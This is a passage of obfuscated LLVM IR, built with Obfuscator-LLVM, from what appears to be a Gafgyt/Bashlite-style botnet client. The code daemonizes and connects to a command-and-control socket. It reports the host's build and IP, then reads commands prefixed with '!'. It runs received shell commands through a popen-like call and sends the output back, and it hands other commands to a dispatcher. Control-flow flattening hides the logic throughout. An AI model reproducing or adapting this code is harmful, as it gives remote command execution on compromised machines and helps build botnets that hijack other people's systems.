  store i32 1969084500, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 -2076822319, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = call i32 @setsid() #2
  %207 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %208 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 822101144, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = call i32 @initConnection()
  %211 = icmp ne i32 %210, 0
  %212 = select i1 %211, i32 490192342, i32 1833118697
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = call i32 @sleep(i32 30)
  store i32 822101144, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* @mainCommSock, align 4
  %217 = call i8* @getBuild()
  %218 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %219 = call i8* @inet_ntoa(i32 %218) #2
  %220 = call i32 (i32, i8*, ...) @sockprintf(i32 %216, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i32 0, i32 0), i8* %217, i8* %219)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 2012051506, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %224 = call i32 @recvLine(i32 %222, i8* %223, i32 4096)
  store i32 %224, i32* %22, align 4
  %225 = icmp ne i32 %224, -1
  %226 = select i1 %225, i32 69673568, i32 -141205426
  store i32 %226, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 1586391864, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i32, i32* %23, align 4
  %230 = load i32, i32* @numpids, align 4
  %231 = icmp slt i32 %229, %230
  %232 = select i1 %231, i32 -466850854, i32 637080031
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32*, i32** @pids, align 8
  %235 = load i32, i32* %23, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds i32, i32* %234, i64 %236
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @waitpid(i32 %238, i32* null, i32 1)
  %240 = icmp sgt i32 %239, 0
  %241 = select i1 %240, i32 718649162, i32 -1281560177
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %23, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %25, align 4
  store i32 -2114589392, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i32, i32* %25, align 4
  %247 = load i32, i32* @numpids, align 4
  %248 = icmp ult i32 %246, %247
  %249 = select i1 %248, i32 -1858349822, i32 -859482085
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32*, i32** @pids, align 8
  %252 = load i32, i32* %25, align 4
  %253 = zext i32 %252 to i64
  %254 = getelementptr inbounds i32, i32* %251, i64 %253
  %255 = load i32, i32* %254, align 4
  %256 = load i32*, i32** @pids, align 8
  %257 = load i32, i32* %25, align 4
  %258 = sub i32 %257, 1
  %259 = zext i32 %258 to i64
  %260 = getelementptr inbounds i32, i32* %256, i64 %259
  store i32 %255, i32* %260, align 4
  store i32 834333604, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i32, i32* %25, align 4
  %263 = add i32 %262, 1
  store i32 %263, i32* %25, align 4
  store i32 -2114589392, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32*, i32** @pids, align 8
  %266 = load i32, i32* %25, align 4
  %267 = sub i32 %266, 1
  %268 = zext i32 %267 to i64
  %269 = getelementptr inbounds i32, i32* %265, i64 %268
  store i32 0, i32* %269, align 4
  %270 = load i32, i32* @numpids, align 4
  %271 = add nsw i32 %270, -1
  store i32 %271, i32* @numpids, align 4
  %272 = load i32, i32* @numpids, align 4
  %273 = add nsw i32 %272, 1
  %274 = sext i32 %273 to i64
  %275 = mul i64 %274, 4
  %276 = call noalias i8* @malloc(i64 %275) #2
  %277 = bitcast i8* %276 to i32*
  store i32* %277, i32** %24, align 8
  store i32 0, i32* %25, align 4
  store i32 698160158, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %25, align 4
  %280 = load i32, i32* @numpids, align 4
  %281 = icmp ult i32 %279, %280
  %282 = select i1 %281, i32 -1852825005, i32 -704132885
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i32*, i32** @pids, align 8
  %285 = load i32, i32* %25, align 4
  %286 = zext i32 %285 to i64
  %287 = getelementptr inbounds i32, i32* %284, i64 %286
  %288 = load i32, i32* %287, align 4
  %289 = load i32*, i32** %24, align 8
  %290 = load i32, i32* %25, align 4
  %291 = zext i32 %290 to i64
  %292 = getelementptr inbounds i32, i32* %289, i64 %291
  store i32 %288, i32* %292, align 4
  store i32 1563883132, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i32, i32* %25, align 4
  %295 = add i32 %294, 1
  store i32 %295, i32* %25, align 4
  store i32 698160158, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i32*, i32** @pids, align 8
  %298 = bitcast i32* %297 to i8*
  call void @free(i8* %298) #2
  %299 = load i32*, i32** %24, align 8
  store i32* %299, i32** @pids, align 8
  store i32 -1281560177, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 638698288, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i32, i32* %23, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %23, align 4
  store i32 1586391864, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i32, i32* %22, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %306
  store i8 0, i8* %307, align 1
  %308 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  call void @trim(i8* %308)
  %309 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %310 = call i8* @strstr(i8* %309, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %311 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %312 = icmp eq i8* %310, %311
  %313 = select i1 %312, i32 1513731826, i32 -837822496
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i32, i32* @mainCommSock, align 4
  %316 = call i32 (i32, i8*, ...) @sockprintf(i32 %315, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i32 0, i32 0))
  store i32 2012051506, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %319 = call i8* @strstr(i8* %318, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i32 0, i32 0)) #10
  %320 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %321 = icmp eq i8* %319, %320
  %322 = select i1 %321, i32 -1487161328, i32 -1043729879
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i32, i32* %12, align 4
  %325 = add nsw i32 %324, 1
  store i32 %325, i32* %12, align 4
  %326 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i32 0, i32 0))
  %327 = load i32, i32* %12, align 4
  %328 = icmp sgt i32 %327, 20
  %329 = select i1 %328, i32 -1416069226, i32 -728518522
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:331:                                    ; preds = %loopEntry
  store i32 -141205426, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  store i8* %333, i8** %26, align 8
  %334 = load i8*, i8** %26, align 8
  %335 = load i8, i8* %334, align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 33
  %338 = select i1 %337, i32 -1073779449, i32 -1280718948
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8*, i8** %26, align 8
  %341 = getelementptr inbounds i8, i8* %340, i64 1
  store i8* %341, i8** %27, align 8
  store i32 -1916413737, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8*, i8** %27, align 8
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp ne i32 %345, 32
  %347 = select i1 %346, i32 1707440759, i32 -836883135
  store i32 %347, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i8*, i8** %27, align 8
  %350 = load i8, i8* %349, align 1
  %351 = zext i8 %350 to i32
  %352 = icmp ne i32 %351, 0
  store i32 -836883135, i32* %switchVar
  store i1 %352, i1* %.reg2mem2
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %354 = select i1 %.reload3, i32 1771480350, i32 -891551943
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8*, i8** %27, align 8
  %357 = getelementptr inbounds i8, i8* %356, i32 1
  store i8* %357, i8** %27, align 8
  store i32 -1916413737, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8*, i8** %27, align 8
  %360 = load i8, i8* %359, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 0
  %363 = select i1 %362, i32 412015130, i32 -1207514106
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store i32 2012051506, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = load i8*, i8** %27, align 8
  store i8 0, i8* %366, align 1
  %367 = load i8*, i8** %26, align 8
  %368 = getelementptr inbounds i8, i8* %367, i64 1
  store i8* %368, i8** %27, align 8
  %369 = load i8*, i8** %26, align 8
  %370 = load i8*, i8** %27, align 8
  %371 = call i64 @strlen(i8* %370) #10
  %372 = getelementptr inbounds i8, i8* %369, i64 %371
  %373 = getelementptr inbounds i8, i8* %372, i64 2
  store i8* %373, i8** %26, align 8
  store i32 1756024414, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8*, i8** %26, align 8
  %376 = load i8*, i8** %26, align 8
  %377 = call i64 @strlen(i8* %376) #10
  %378 = sub i64 %377, 1
  %379 = getelementptr inbounds i8, i8* %375, i64 %378
  %380 = load i8, i8* %379, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 10
  %383 = select i1 %382, i32 2091930468, i32 1707603004
  store i32 %383, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i8*, i8** %26, align 8
  %386 = load i8*, i8** %26, align 8
  %387 = call i64 @strlen(i8* %386) #10
  %388 = sub i64 %387, 1
  %389 = getelementptr inbounds i8, i8* %385, i64 %388
  %390 = load i8, i8* %389, align 1
  %391 = zext i8 %390 to i32
  %392 = icmp eq i32 %391, 13
  store i32 2091930468, i32* %switchVar
  store i1 %392, i1* %.reg2mem4
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %394 = select i1 %.reload5, i32 863508377, i32 -419770031
  store i32 %394, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i8*, i8** %26, align 8
  %397 = load i8*, i8** %26, align 8
  %398 = call i64 @strlen(i8* %397) #10
  %399 = sub i64 %398, 1
  %400 = getelementptr inbounds i8, i8* %396, i64 %399
  store i8 0, i8* %400, align 1
  store i32 1756024414, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i8*, i8** %26, align 8
  store i8* %402, i8** %28, align 8
  store i32 500159947, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  %404 = load i8*, i8** %26, align 8
  %405 = load i8, i8* %404, align 1
  %406 = zext i8 %405 to i32
  %407 = icmp ne i32 %406, 32
  %408 = select i1 %407, i32 1034316699, i32 -1782147675
  store i32 %408, i32* %switchVar
  store i1 false, i1* %.reg2mem6
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i8*, i8** %26, align 8
  %411 = load i8, i8* %410, align 1
  %412 = zext i8 %411 to i32
  %413 = icmp ne i32 %412, 0
  store i32 -1782147675, i32* %switchVar
  store i1 %413, i1* %.reg2mem6
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  %.reload7 = load i1, i1* %.reg2mem6
  %415 = select i1 %.reload7, i32 950940417, i32 -1042222462
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i8*, i8** %26, align 8
  %418 = getelementptr inbounds i8, i8* %417, i32 1
  store i8* %418, i8** %26, align 8
  store i32 500159947, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i8*, i8** %26, align 8
  store i8 0, i8* %420, align 1
  %421 = load i8*, i8** %26, align 8
  %422 = getelementptr inbounds i8, i8* %421, i32 1
  store i8* %422, i8** %26, align 8
  %423 = load i8*, i8** %28, align 8
  store i8* %423, i8** %29, align 8
  store i32 -653008128, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i8*, i8** %29, align 8
  %426 = load i8, i8* %425, align 1
  %427 = icmp ne i8 %426, 0
  %428 = select i1 %427, i32 -1077025599, i32 1913659419
  store i32 %428, i32* %switchVar
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = load i8*, i8** %29, align 8
  %431 = load i8, i8* %430, align 1
  %432 = zext i8 %431 to i32
  %433 = call i32 @toupper(i32 %432) #10
  %434 = trunc i32 %433 to i8
  %435 = load i8*, i8** %29, align 8
  store i8 %434, i8* %435, align 1
  %436 = load i8*, i8** %29, align 8
  %437 = getelementptr inbounds i8, i8* %436, i32 1
  store i8* %437, i8** %29, align 8
  store i32 -653008128, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = load i8*, i8** %28, align 8
  %440 = call i32 @strcmp(i8* %439, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i32 0, i32 0)) #10
  %441 = icmp eq i32 %440, 0
  %442 = select i1 %441, i32 -1080709211, i32 -412636856
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = call i32 @listFork()
  %445 = icmp ne i32 %444, 0
  %446 = select i1 %445, i32 1413391110, i32 717790711
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  store i32 2012051506, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %449, i8 0, i64 1024, i32 16, i1 false)
  %450 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %451 = load i8*, i8** %26, align 8
  %452 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i32 0, i32 0), i8* %451)
  %453 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %454 = call i32 @fdpopen(i8* %453, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store i32 %454, i32* %31, align 4
  store i32 699062616, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %457 = load i32, i32* %31, align 4
  %458 = call i8* @fdgets(i8* %456, i32 1024, i32 %457)
  %459 = icmp ne i8* %458, null
  %460 = select i1 %459, i32 1596357713, i32 -1157199939
  store i32 %460, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  %462 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @trim(i8* %462)
  %463 = load i32, i32* @mainCommSock, align 4
  %464 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %465 = call i32 (i32, i8*, ...) @sockprintf(i32 %463, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i32 0, i32 0), i8* %464)
  %466 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %466, i8 0, i64 1024, i32 16, i1 false)
  %467 = call i32 @sleep(i32 1)
  store i32 699062616, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  %469 = load i32, i32* %31, align 4
  %470 = call i32 @fdpclose(i32 %469)
  call void @exit(i32 0) #14
  unreachable

; <label>:471:                                    ; preds = %loopEntry
  store i32 1, i32* %33, align 4
  %472 = load i8*, i8** %26, align 8
  %473 = call i8* @strtok(i8* %472, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %473, i8** %34, align 8
  %474 = load i8*, i8** %28, align 8
  %475 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  store i8* %474, i8** %475, align 16
  store i32 -999504094, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load i8*, i8** %34, align 8
  %478 = icmp ne i8* %477, null
  %479 = select i1 %478, i32 650460973, i32 1850112272
  store i32 %479, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i8*, i8** %34, align 8
  %482 = load i8, i8* %481, align 1
  %483 = zext i8 %482 to i32
  %484 = icmp ne i32 %483, 10
  %485 = select i1 %484, i32 -152965341, i32 -1522795545
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i8*, i8** %34, align 8
  %488 = call i64 @strlen(i8* %487) #10
  %489 = add i64 %488, 1
  %490 = call noalias i8* @malloc(i64 %489) #2
  %491 = load i32, i32* %33, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %492
  store i8* %490, i8** %493, align 8
  %494 = load i32, i32* %33, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %495
  %497 = load i8*, i8** %496, align 8
  %498 = load i8*, i8** %34, align 8
  %499 = call i64 @strlen(i8* %498) #10
  %500 = add i64 %499, 1
  call void @llvm.memset.p0i8.i64(i8* %497, i8 0, i64 %500, i32 1, i1 false)
  %501 = load i32, i32* %33, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %502
  %504 = load i8*, i8** %503, align 8
  %505 = load i8*, i8** %34, align 8
  %506 = call i8* @strcpy(i8* %504, i8* %505) #2
  %507 = load i32, i32* %33, align 4
  %508 = add nsw i32 %507, 1
  store i32 %508, i32* %33, align 4
  store i32 -1522795545, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %510, i8** %34, align 8
  store i32 -999504094, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %33, align 4
  %513 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i32 0, i32 0
  call void @processCmd(i32 %512, i8** %513)
  %514 = load i32, i32* %33, align 4
  %515 = icmp sgt i32 %514, 1
  %516 = select i1 %515, i32 -68219443, i32 -103106470
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  store i32 -1553724777, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i32, i32* %35, align 4
  %520 = load i32, i32* %33, align 4
  %521 = icmp slt i32 %519, %520
  %522 = select i1 %521, i32 -1020958373, i32 131107019
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %35, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %525
  %527 = load i8*, i8** %526, align 8
  call void @free(i8* %527) #2
  store i32 399782352, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i32, i32* %35, align 4
  %530 = add nsw i32 %529, 1
  store i32 %530, i32* %35, align 4
  store i32 -1553724777, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  store i32 -103106470, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  store i32 -1280718948, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  store i32 2012051506, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  store i32 822101144, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = load i32, i32* %3, align 4
  ret i32 %536

loopEnd:                                          ; preds = %534, %533, %532, %531, %528, %523, %518, %517, %511, %509, %486, %480, %476, %471, %461, %455, %448, %447, %443, %438, %429, %424, %419, %416, %414, %409, %403, %401, %395, %393, %384, %374, %365, %364, %358, %355, %353, %348, %342, %339, %332, %331, %323, %317, %314, %304, %301, %300, %296, %293, %283, %278, %264, %261, %250, %245, %242, %233, %228, %227, %221, %215, %213, %209, %205, %204, %202, %201, %200, %198, %197, %193, %188, %184, %176, %175, %172, %171, %168, %167, %161, %153, %149, %148, %145, %136, %130, %120, %117, %106, %105, %93, %89, %86, %55, %48, %43, %first, %switchDefault
  br label %loopEntry
}

declare i32 @umask(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146541122}
!2 = !{i32 -2146540429}
!3 = !{i32 -2146539624}
!4 = !{i32 -2146538867}
!5 = !{i32 -2146538147}
!6 = !{i32 -2146537205}
!7 = !{i32 -2146535726}
!8 = !{i32 -2146535009}
!9 = !{i32 -2146534171}
